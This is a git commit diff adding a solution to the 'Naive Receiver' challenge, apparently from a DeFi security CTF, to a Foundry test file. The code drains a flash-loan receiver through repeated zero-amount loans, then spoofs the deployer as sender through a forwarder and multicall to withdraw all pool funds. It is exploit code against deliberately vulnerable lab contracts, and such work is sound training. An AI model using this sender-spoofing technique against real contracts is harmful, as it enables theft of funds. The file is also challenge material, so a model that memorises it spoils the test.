cf922b44c9ca8759cd7e2b3e567cbda6efff0700
Stefano Candori <stefano.candori@helloprima.com>
2025-12-31 10:39:40 +0000

    done naive receiver, copying from internet

--- test/naive-receiver/NaiveReceiver.t.sol
+++ test/naive-receiver/NaiveReceiver.t.sol
@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -42,7 +43,11 @@ contract NaiveReceiverChallenge is Test {
         forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
+            address(forwarder),
+            payable(weth),
+            deployer
+        );
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
@@ -77,7 +82,63 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        uint8 numberOfCalls = 11;
+
+        // Create an array of encoded flashLoan calls
+        bytes[] memory encodedCalls = new bytes[](numberOfCalls);
+
+        for (uint8 i = 0; i < 10; i++) {
+            // Encode the call to flashLoan
+            encodedCalls[i] = abi.encodeWithSignature(
+                "flashLoan(address,address,uint256,bytes)",
+                address(receiver),
+                address(weth),
+                0,
+                ""
+            );
+        }
+
+        // Encode the call to withdraw
+        encodedCalls[10] = abi.encodePacked(
+            abi.encodeCall(
+                NaiveReceiverPool.withdraw,
+                (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))
+            ),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        // Encode the multicall data
+        bytes memory multicallData = abi.encodeCall(
+            pool.multicall,
+            encodedCalls
+        );
+
+        // Create the request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: forwarder.nonces(player),
+            data: multicallData,
+            deadline: 1 days
+        });
+
+        // Hash the request
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+
+        // Sign the request
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute the transaction
+        forwarder.execute(request, signature);
     }
 
     /**
@@ -88,12 +149,24 @@ contract NaiveReceiverChallenge is Test {
         assertLe(vm.getNonce(player), 2);
 
         // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
+        assertEq(
+            weth.balanceOf(address(receiver)),
+            0,
+            "Unexpected balance in receiver contract"
+        );
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+        assertEq(
+            weth.balanceOf(address(pool)),
+            0,
+            "Unexpected balance in pool"
+        );
 
         // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+        assertEq(
+            weth.balanceOf(recovery),
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            "Not enough WETH in recovery account"
+        );
     }
 }
